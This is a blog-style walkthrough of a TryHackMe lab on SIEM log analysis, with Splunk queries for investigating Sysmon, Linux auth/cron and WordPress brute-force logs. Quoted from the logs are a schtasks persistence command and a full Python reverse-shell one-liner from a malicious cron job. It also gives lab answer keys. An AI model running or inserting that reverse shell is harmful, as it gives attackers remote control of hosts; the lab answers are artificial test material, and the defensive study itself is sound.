---
title: Log Analysis with SIEM Walkthrough
description: Understand how logs are ingested, normalized, and analyzed inside a SIEM platform.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

Raw logs from endpoints, Linux servers, and web applications are difficult to analyze in isolation. In this walkthrough, we cover the core concepts behind SIEM log collection, normalization, and correlation, and then pivot into Splunk to investigate three practical intrusion scenarios across Windows Sysmon logs, Linux authentication and cron logs, and WordPress web server access logs.

---

**Learning Objectives**

- Understand how logs from different sources are collected and ingested into a SIEM
- Learn how log normalization, parsing, and correlation rules work
- Practice querying and analyzing security logs to detect malicious activity

---
## Task 1.1
**Which capability of SIEM allows it to link separate events together like pieces of a puzzle?**

**Answer**: `Correlation`

**Why?**
As illustrated in the diagram, correlation connects separate events across identity providers, system logs, and network logs to reconstruct the full attack chain and trigger a single actionable alert.

![](../../assets/Pasted%20image%2020261112193058.png)

## Task 1.2
**Which feature of SIEM makes sure that logs from different sources are gathered in one place?**

**Answer**: `Centralisation`

**Why?**
Centralisation collects telemetry from network devices, cloud services, and identity providers into one central platform so analysts do not have to pivot across dozens of separate consoles.

![](../../assets/Pasted%20image%2020261112193126.png)

## Task 2.1
**What process converts logs from different formats into a single consistent structure?**

**Answer**: `Normalisation`

**Why?**
Different log sources output events in JSON, XML, or plain text. Normalisation parses those raw formats and maps their fields into a consistent schema so a single query can search across multiple vendors.

![](../../assets/Pasted%20image%2020261112193320.png)

## Task 2.2
**Which category of log sources captures activities like authentication, process execution, and file access on individual systems?**

**Answer**: `Host-Based`

**Why?**
Host-based log sources record local endpoint activity including authentication, account management, process auditing, object access, policy changes, and system events.

![](../../assets/Pasted%20image%2020261112193408.png)

## Task 3.1
**Which IP address was the connection established with on port 5678?**

**Answer**: `10.10.114.80`

**Why?**
In the Windows investigation (`index=task4`), we filter for Sysmon network connection events (`EventCode=3`) targeting port `5678`:

```spl
index=task4 EventCode=3 DestinationPort=5678
| table _time ComputerName Image SourceIp SourcePort DestinationIp DestinationPort Protocol
```

The resulting table shows an outbound connection from `WIN-105` to `DestinationIp` `10.10.114.80`.

![](../../assets/Pasted%20image%2020261112194603.png)

## Task 3.2
**Which process initiated this suspicious connection?**

**Answer**: `SharePoInt.exe`

**Why?**
Inspecting the `Image` field of that same `EventCode=3` event reveals the binary `C:\Windows\Temp\SharePoInt.exe` (notice the capital `I` in `SharePoInt.exe` masquerading as Microsoft SharePoint and running out of `C:\Windows\Temp\`).

![](../../assets/Pasted%20image%2020261112194720.png)

## Task 3.3
**What is the MD5 hash of the malicious binary?**

**Answer**: `770D14FFA142F09730B415506249E7D1`

**Why?**
To see everything this binary did on the host, we search across `index=task4` for `"C:\\Windows\\Temp\\SharePoInt.exe"`, which returns 10 Sysmon events.

![](../../assets/Pasted%20image%2020261112195050.png)

Looking at the `EventCode` breakdown on the left sidebar, we can see five distinct Sysmon event types associated with the executable:
- **Event ID 1 (`ProcessCreate`)**: A new process was created (5 events).
- **Event ID 3 (`NetworkConnect`)**: A TCP/UDP network connection was initiated (1 event).
- **Event ID 7 (`ImageLoaded`)**: A module or binary image was loaded, which includes full cryptographic file hashes (1 event).
- **Event ID 10 (`ProcessAccess`)**: A process opened another process in memory, often seen during credential dumping or injection (2 events).
- **Event ID 11 (`FileCreate`)**: A file was created or overwritten on disk (1 event).

![](../../assets/Pasted%20image%2020261112195115.png)

Filtering specifically for `EventCode=7` (`ImageLoaded`) or `EventCode=1` gives us the `Hashes` field containing `MD5=770D14FFA142F09730B415506249E7D1`.

![](../../assets/Pasted%20image%2020261112195029.png)

## Task 3.4
**What is the name of the scheduled task that was created on the system?**

**Answer**: `Office365 Install`

**Why?**
Inspecting the `EventCode=1` process creation logs associated with `SharePoInt.exe` reveals `schtasks.exe` executing the following command line to establish persistence:

```text
schtasks /create /sc once /st 15:30 /tn "Office365 Install" /tr "C:\Windows\Temp\SharePoInt.exe"
```

![](../../assets/Pasted%20image%2020261112195558.png)

## Task 4.1
**What is the timestamp of when the `remote-ssh` account was created?**

**Answer**: `2025-08-12 09:52:57`

**Why?**
Pivoting to the Linux logs in `index=task5`, we can either browse `source="auth.log"` manually around the sudo session or filter directly by `useradd`:

```spl
index=task5 source="auth.log" useradd
```

![](../../assets/Pasted%20image%2020261112201738.png)

Both approaches show `COMMAND=/usr/sbin/useradd remote-ssh` and `new user: name=remote-ssh, UID=1004, GID=1004` occurring at `2025-08-12 09:52:57`.

![](../../assets/Pasted%20image%2020261112202035.png)

## Task 4.2
**Which user successfully escalated their privileges to `root` prior to this action?**

**Answer**: `jack-brown`

**Why?**
Filtering `index=task5 source="auth.log" user=root` shows `pam_unix(sudo:session): session opened for user root(uid=0) by jack-brown(uid=1003)` at `09:52:48`, right before the `remote-ssh` account was created.

![](../../assets/Pasted%20image%2020261112202154.png)

## Task 4.3
**From which IP address did the user `jack-brown` log in via SSH?**

**Answer**: `10.14.94.82`

**Why?**
Querying `index=task5 source="auth.log" user=jack-brown` displays the SSH authentication history for the account, showing `Accepted password for jack-brown from 10.14.94.82 port 54451 ssh2` at `09:51:29`.

![](../../assets/Pasted%20image%2020261112202426.png)

## Task 4.4
**How many failed login attempts occurred before the user `jack-brown` succeeded?**

**Answer**: `4` (or `6` total attempts across `5` log events)

**Why?**
Running `index=task5 source="auth.log" | search "Failed password"` returns 5 log entries prior to the successful login: 4 direct `Failed password for jack-brown from 10.14.94.82` events and 1 syslog compression line reading `message repeated 2 times: [ Failed password for jack-brown from 10.14.94.82 port 54445 ssh2]`.

![](../../assets/Pasted%20image%2020261112202939.png)

## Task 4.5
**Which port is configured in the malicious cronjob for the reverse shell connection?**

**Answer**: `7654`

**Why?**
Searching syslog for cron activity with `index=task5 sourcetype=syslog ("CRON" OR "cron")` reveals a root cron job executing a Python 3 reverse shell back to `10.10.33.31` on port `7654`:

```text
(/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.33.31",7654));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /tmp/cron_output.log 2>&1)
```

![](../../assets/Pasted%20image%2020261112203604.png)

## Task 5.1
**Which URI path had the highest number of requests?**

**Answer**: `/wp-login.php`

**Why?**
In the web application log investigation (`index=task6`), opening the `uri` field summary shows `/wp-login.php` at the top with `905` requests (`77.816%` of all traffic).

![](../../assets/Pasted%20image%2020261112203859.png)

## Task 5.2
**Which IP address is responsible for the highest number of requests to `/wp-login.php`?**

**Answer**: `10.10.243.134`

**Why?**
Filtering for `index=task6 uri="/wp-login.php"` and inspecting the `clientip` field shows `10.10.243.134` leading with `584` requests (`64.53%`).

![](../../assets/Pasted%20image%2020261112204010.png)

## Task 5.3
**Which type of attack was attempted by this IP address against `/wp-login.php`?**

**Answer**: `Brute Force`

**Why?**
Looking at the raw access logs from `10.10.243.134`, we see a rapid flood of repeated `POST /wp-login.php HTTP/1.1` requests firing multiple times per second, which is a classic login brute-force attack.

![](../../assets/Pasted%20image%2020261112204037.png)

## Task 5.4
**Which tool and version was used to perform these requests?**

**Answer**: `WPScan v3.8.28`

**Why?**
Expanding one of the `POST /wp-login.php` events from `10.10.243.134` and checking the `useragent` field reveals `WPScan v3.8.28 (https://wpscan.com/wordpress-security-scanner)`.

![](../../assets/Pasted%20image%2020261112204124.png)

---

## Personal Note: SIEM Log Sources & Attack Signatures Cheat Sheet

Quick summary of the Linux, Windows, and Web log sources we queried in Splunk across the four scenarios:

| Environment | Log Source / Event ID | Attack Pattern Investigated | Useful Splunk Search / Filter |
| :--- | :--- | :--- | :--- |
| **Web Server (Apache/Nginx)** | `access.log` | Web enumeration (`Gobuster`), command injection (`/ping?ip=...`), WordPress brute force (`WPScan`) | - `index=task3 sourcetype=access_combined`<br>- `index=task6 uri="/wp-login.php"` (check `clientip` & `useragent`) |
| **Linux Host** | `/var/log/auth.log`<br>`/var/log/syslog` | SSH brute force (`Failed password`), privilege escalation (`sudo`), persistence (`useradd`, `cron` reverse shell) | - `index=task5 source="auth.log" ("Failed password" OR "Accepted password")`<br>- `index=task5 source="auth.log" useradd`<br>- `index=task5 sourcetype=syslog ("CRON" OR "cron")` |
| **Windows Security** | `Event ID 4625` / `4624` | RDP brute force (`Logon Type 10` / `3`) followed by successful login | - `index=task4 EventCode=4625 OR EventCode=4624` |
| **Windows Sysmon** | `Event ID 1` (`ProcessCreate`)<br>`Event ID 3` (`NetworkConnect`) | Post-exploitation reconnaissance (`whoami`, `tasklist`), curl C2 download (`velociraptor`), data exfiltration | - `index=task3 sourcetype=sysmon EventCode=1`<br>- `index=task4 EventCode=3` (check `Image` and `DestinationIp`/`DestinationPort`) |
